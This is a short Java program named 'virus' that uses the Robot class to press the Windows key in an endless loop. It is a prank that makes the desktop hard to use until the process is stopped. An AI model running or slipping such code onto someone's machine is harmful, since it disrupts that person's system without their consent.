
import java.awt.Robot;
import java.awt.event.KeyEvent;

public class virus{
    public static void main(String[] args) {

        try {
            while (true) {
                Robot r = new Robot();
                r.keyPress(KeyEvent.VK_WINDOWS);
                r.keyRelease(KeyEvent.VK_WINDOWS);
            }
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}
